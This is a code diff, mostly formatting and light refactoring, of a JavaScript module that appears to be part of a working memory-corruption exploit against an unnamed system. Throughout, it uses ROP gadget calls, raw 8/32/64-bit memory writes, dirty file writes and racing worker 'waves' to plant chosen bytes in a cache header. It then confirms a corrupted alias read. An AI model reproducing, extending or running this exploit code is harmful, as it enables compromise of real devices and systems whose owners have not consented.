@@ -2,59 +2,62 @@ import coreRuntime, {waitMs} from "../runtime.mjs";
 import {readHexBytes} from "./util.mjs";
 import {verboseLog} from "../logger.mjs";
 import {
-  analyzeWave,
-  configurePayload,
-  nulWrites
+    analyzeWave,
+    configurePayload,
+    nulWrites
 } from "./wave.mjs";
 
 const {
-  GADGET_MEMSET,
-  allocPage,
-  call_rop,
-  closeReservationGroup,
-  executeWave,
-  frameArgSlot,
-  hex32,
-  ipcStorageRead,
-  openReservationGroup,
-  prepPacket,
-  resetWaveState,
-  roleSendCode,
-  write32,
-  write64,
-  write8,
-  writeDirtyData
+    GADGET_MEMSET,
+    allocPage,
+    call_rop,
+    closeReservationGroup,
+    executeWave,
+    frameArgSlot,
+    ipcStorageRead,
+    openReservationGroup,
+    prepareReleaseRequest,
+    resetWaveState,
+    roleSendCode,
+    write32,
+    write64,
+    writeDirtyData
 } = coreRuntime;
 
-// ── Cache header installation and retirement ──────────────────────────────
+// ----- Cache header installation and retirement -----
 
+/**
+ * Install one cache header copy for the candidate address and return the copy
+ * state. A header install runs real waves, so the caller keeps ownership of the
+ * retirement flag and of the wave counters.
+ */
 export async function installAddressHeader(input) {
     const config = input.config;
-    let desiredBytes = input.desiredBytes;
+    const desiredBytes = input.desiredBytes;
     let stageName = input.stageName;
-    let REQ = input.REQ;
+    const REQ = input.REQ;
     let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
     let copyWavesTotal = input.copyWavesTotal;
-    let dirtyFilePath = input.dirtyFilePath;
-    let dirtyWriteBuf = input.dirtyWriteBuf;
-    let dirtyWritePkt = input.dirtyWritePkt;
-    let gates = input.gates;
-    let pinPkt = input.pinPkt;
-    let pktBuf = input.pktBuf;
-    let rawScheduling = input.rawScheduling;
-    let rootSession = input.rootSession;
-    let savedHandle = input.savedHandle;
-    let sendIndices = input.sendIndices;
-    let triggerHandle = input.triggerHandle;
-    let waveData = input.waveData;
-    let waveExtra = input.waveExtra;
+    const dirtyFilePath = input.dirtyFilePath;
+    const dirtyWriteBuf = input.dirtyWriteBuf;
+    const dirtyWritePkt = input.dirtyWritePkt;
+    const gates = input.gates;
+    const pinPkt = input.pinPkt;
+    const pktBuf = input.pktBuf;
+    const rawScheduling = input.rawScheduling;
+    const rootSession = input.rootSession;
+    const savedHandle = input.savedHandle;
+    const sendIndices = input.sendIndices;
+    const triggerHandle = input.triggerHandle;
+    const waveData = input.waveData;
+    const waveExtra = input.waveExtra;
     let wavesJoined = input.wavesJoined;
     let wavesStarted = input.wavesStarted;
-    let workerResources = input.workerResources;
+    const workerResources = input.workerResources;
     let workerStateSafe = input.workerStateSafe;
     const shouldStop = input.shouldStop;
-    let fragmentBufs = input.fragmentBufs;
-    let triggerBuf = input.triggerBuf;
+    const fragmentBufs = input.fragmentBufs;
+    const triggerBuf = input.triggerBuf;
     let analysis = input.analysis;
     const addressCopyInputs = {...input};
     delete addressCopyInputs.desiredBytes;
@@ -72,14 +75,25 @@ export async function installAddressHeader(input) {
     }});
     stageName = stageName || "cache-address";
     var padded = desiredBytes.slice();
-    if (padded.length === 0 || padded[padded.length - 1] !== 0) padded.push(0);
+
+    if (padded.length === 0 || padded[padded.length - 1] !== 0) {
+        padded.push(0);
+    }
+
     var steps;
-    try { steps = nulWrites(padded); }
-    catch (error) {
+    try {
+        steps = nulWrites(padded);
+    } catch {
         return copyResult(false);
     }
-    if (!steps.length) return copyResult(false);
-    if (stoppedByUser) return copyResult(false);
+
+    if (!steps.length) {
+        return copyResult(false);
+    }
+
+    if (stoppedByUser) {
+        return copyResult(false);
+    }
 
     for (var stepIdx = 0; stepIdx < steps.length &&
         !stoppedByUser && !shouldStop?.(); stepIdx++) {
@@ -92,36 +106,36 @@ export async function installAddressHeader(input) {
             attempt < config.MAX_CACHE_WAVES_PER_STEP &&
             !stoppedByUser && !shouldStop?.(); attempt++) {
             addrAttempts++;
+
             if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
-                    dirtyWriteBuf, dirtyWritePkt)) {
+                                dirtyWriteBuf, dirtyWritePkt)) {
                 return copyResult(false);
             }
 
             resetWaveState(waveData.frames, waveData.backups, REQ,
-                waveData.pktBackups, gates, waveExtra);
+                           waveData.pktBackups, gates, waveExtra);
             var payloadSetup = configurePayload(step.bytes,
-                {config, REQ, fragmentBufs, triggerBuf});
-            if (!payloadSetup.configured) return copyResult(false);
+                                                {config, REQ, fragmentBufs, triggerBuf});
+
+            if (!payloadSetup.configured) {
+                return copyResult(false);
+            }
+
             var group = openReservationGroup(rootSession, pktBuf, 59);
+
             if (!group.ok) {
                 return copyResult(false);
             }
 
-            prepPacket(REQ[9], 4, 8, []);
-            write8(REQ[9] + 0x10n, 2n);
-            write32(REQ[9] + 0x14n, BigInt(group.outer));
-            write32(REQ[9] + 0x1Cn, 0n);
-            write64(frameArgSlot(waveData.frames[9].frame,
-                waveData.frames[9].count, sendIndices[9], 0),
-                BigInt(group.session));
+            prepareReleaseRequest(REQ[9], waveData.frames, sendIndices, group);
             write64(frameArgSlot(waveData.frames[12].frame,
-                waveData.frames[12].count, sendIndices[12], 0),
-                BigInt(triggerHandle));
+                                 waveData.frames[12].count, sendIndices[12], 0),
+                    BigInt(triggerHandle));
             write32(pinPkt + 0x18n, 1009n);
 
             var wave = executeWave(waveData.frames, rawScheduling,
-                workerResources, gates, sendIndices,
-                config.workerRoles);
+                                   workerResources, gates, sendIndices,
+                                   config.workerRoles);
             wavesStarted += wave.started === config.WORKER_COUNT
                 ? 1 : 0;
 
@@ -130,9 +144,9 @@ export async function installAddressHeader(input) {
                 wave.started < config.WORKER_COUNT) {
 
                 var releaseCode = roleSendCode(waveData.frames, 9,
-                    sendIndices[9]);
+                                               sendIndices[9]);
                 closeReservationGroup(group,
-                    wave.created < config.WORKER_COUNT ||
+                                      wave.created < config.WORKER_COUNT ||
                         releaseCode !== 0, pktBuf);
                 workerStateSafe = wave.workerStateSafe === true;
                 return copyResult(false);
@@ -142,44 +156,58 @@ export async function installAddressHeader(input) {
                 workerStateSafe = false;
                 return copyResult(false);
             }
+
             wavesJoined++;
 
             var result = analyzeWave(stageName,
-                wave, waveData, group, false, analysis);
+                                     wave, waveData, group, false, analysis);
             analysis = {...analysis, pinHandle: result.pinHandle,
                 pinFirstWaveQualified: result.pinFirstWaveQualified};
             var releaseWasSent = roleSendCode(waveData.frames, 9,
-                sendIndices[9]) === 0;
+                                              sendIndices[9]) === 0;
             closeReservationGroup(group, !releaseWasSent, pktBuf);
             copyWavesTotal++;
 
             var accepted = result.window && result.preReleaseUsed !== null &&
                 result.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                 result.changedPaths.length === 0;
+
             if (!accepted) {
-                if (!result.window) addrWinFail++;
-                else if (result.preReleaseUsed === null ||
-                         result.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD)
+                if (!result.window) {
+                    addrWinFail++;
+                } else if (result.preReleaseUsed === null ||
+                         result.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD) {
                     addrPreLow++;
-                else addrPathMiss++;
+                } else {
+                    addrPathMiss++;
+                }
             }
+
             if (accepted) {
                 acceptedResult = result;
                 candidateCacheNeedsRetirement = true;
                 confirmed = true;
             }
 
-            // Let controller actions run between synchronous copy waves.
+            // Let controller actions run between two copy waves.
             await waitMs(0);
-            if (shouldStop?.()) stoppedByUser = true;
-            if (confirmed || stoppedByUser) break;
+
+            if (shouldStop?.()) {
+                stoppedByUser = true;
+            }
+
+            if (confirmed || stoppedByUser) {
+                break;
+            }
         }
+
         if (stoppedByUser) {
             await verboseLog(stageName + " stopped during step " +
                 (stepIdx + 1) + "/" + steps.length + " after " +
                 addrAttempts + " waves.");
             return copyResult(false);
         }
+
         if (confirmed) {
             await verboseLog(stageName + " step " +
                 (stepIdx + 1) + "/" + steps.length + " accepted after " +
@@ -188,49 +216,67 @@ export async function installAddressHeader(input) {
                     ? " · margin=" + acceptedResult.margin + "/300µs" : "") +
                 (acceptedResult?.preReleaseUsed != null
                     ? " · cache=0x" +
-                      Number(acceptedResult.preReleaseUsed).toString(16) : "") +
-                ".");
-            // Let the accepted wave and step summary reach the host before
-            // starting another cache-address step or the verification reads.
+                      Number(acceptedResult.preReleaseUsed).toString(16) : "") + ".");
+
+            /*
+             * Give the host time to receive the accepted wave and step summary before
+             * the next cache-address step or the verification reads begin.
+             */
         } else {
             await verboseLog(stageName + " step " +
                 (stepIdx + 1) + "/" + steps.length + " rejected after " +
-                addrAttempts + " waves: window=" + addrWinFail +
-                ", cache=" + addrPreLow + ", path=" + addrPathMiss + ".");
+                addrAttempts + " waves: window=" + addrWinFail + ", cache=" + addrPreLow + ", path=" + addrPathMiss + ".");
         }
-        if (!confirmed) return copyResult(false);
+
+        if (!confirmed) {
+            return copyResult(false);
+        }
     }
-    if (shouldStop?.()) stoppedByUser = true;
+
+    if (shouldStop?.()) {
+        stoppedByUser = true;
+    }
+
     return copyResult(!stoppedByUser);
 }
+/**
+ * Prove that the cache entry offset lands on the bucket period the address plan
+ * assumes: install the prefix, zero byte 0, then read the alias back.
+ */
 export async function qualifyCacheBucketPeriod(input) {
-    let candidateHandle = input.candidateHandle;
-    let primeHex = input.primeHex;
-    let storageHandle = input.storageHandle;
+    const candidateHandle = input.candidateHandle;
+    const primeHex = input.primeHex;
+    const storageHandle = input.storageHandle;
     let addressCopy = input.addressCopy;
     const shouldStop = input.shouldStop;
     var controlBuf = allocPage(0x1000);
     call_rop(GADGET_MEMSET, controlBuf, 0xA5n, 16n);
     var control = ipcStorageRead(storageHandle, 0x28000, 16, controlBuf);
+
     if (control.error !== 0) {
         return {ok: false, addressCopy};
     }
 
-    // Match the reference two-copy test: first install the UTF-8 prefix,
-    // then place a NUL in byte 0 so the signed entry offset becomes 0x28000.
+    /*
+     * Mirror the reference two-copy test: install the UTF-8 prefix first, then put a
+     * NUL in byte 0 so the signed entry offset becomes 0x28000.
+     */
     var prefixCopy = await installAddressHeader({...addressCopy,
         desiredBytes: [0xC2, 0x80, 0x02],
         stageName: "cache-period-prefix", shouldStop});
     addressCopy = prefixCopy.addressCopy;
     var periodPrefixOk = prefixCopy.ok;
     var periodZeroOk = false;
+
     if (periodPrefixOk) {
         var zeroCopy = await installAddressHeader({...addressCopy,
             desiredBytes: [], stageName: "cache-period-zero", shouldStop});
         addressCopy = zeroCopy.addressCopy;
         periodZeroOk = zeroCopy.ok;
     }
+
     var periodAliasOk = false;
+
     if (periodZeroOk) {
         var periodBuf = allocPage(0x1000);
         call_rop(GADGET_MEMSET, periodBuf, 0xA5n, 16n);
@@ -240,34 +286,53 @@ export async function qualifyCacheBucketPeriod(input) {
         periodAliasOk = periodRead.error === 0 && periodHex === primeHex;
     }
 
-    // Leave the candidate in this measured state. The next address-header
-    // copy replaces all 0x28 bytes; if planning or copying fails, retirement
-    // clears the valid byte before the handle can be closed.
+    /*
+     * Leave the candidate in this measured state. The next address-header copy
+     * replaces all 0x28 bytes. If planning or copying fails, retirement clears the
+     * valid byte before the handle can be closed.
+     */
     return {ok: periodAliasOk, addressCopy};
 }
 
+/**
+ * Read the candidate storage and report what it shows: the original bytes, the
+ * alias, or nothing recognisable.
+ *
+ * Read-only, so it is safe to call when a verdict is needed.
+ */
 export function inspectCandidateCacheAlias(candidateHandle, addressCopy) {
-    if (!addressCopy || !addressCopy.config)
+    if (!addressCopy || !addressCopy.config) {
         return {state: "unavailable", error: null, detail: "address baseline unavailable"};
+    }
+
     var baseline = addressCopy.aliasControlHex;
     var aliasBytes = addressCopy.primeHex;
-    if (!baseline || !aliasBytes || baseline === aliasBytes)
+
+    if (!baseline || !aliasBytes || baseline === aliasBytes) {
         return {state: "unavailable", error: null, detail: "distinct baseline missing"};
+    }
 
     try {
         var verifyBuf = allocPage(0x1000);
         call_rop(GADGET_MEMSET, verifyBuf, 0xA5n, 16n);
         var readback = ipcStorageRead(candidateHandle,
-            addressCopy.config.ALIAS_OFFSET, 16, verifyBuf);
-        if (!readback || readback.error !== 0)
+                                      addressCopy.config.ALIAS_OFFSET, 16, verifyBuf);
+
+        if (!readback || readback.error !== 0) {
             return {state: "unavailable", error: readback?.error ?? null,
                 detail: "candidate alias read failed"};
+        }
 
         var readbackHex = readHexBytes(verifyBuf, 16);
-        if (readbackHex === baseline)
+
+        if (readbackHex === baseline) {
             return {state: "original", error: readback.error, readbackHex};
-        if (readbackHex === aliasBytes)
+        }
+
+        if (readbackHex === aliasBytes) {
             return {state: "aliased", error: readback.error, readbackHex};
+        }
+
         return {state: "unexpected", error: readback.error, readbackHex};
     } catch (error) {
         return {state: "unavailable", error: null,
